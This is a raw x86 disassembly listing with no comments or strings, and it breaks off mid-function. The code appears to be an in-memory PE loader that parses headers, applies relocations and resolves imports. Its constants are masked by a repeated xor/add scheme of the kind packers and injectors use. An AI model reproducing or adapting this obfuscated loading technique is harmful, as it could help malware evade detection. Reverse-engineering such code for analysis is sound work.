  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
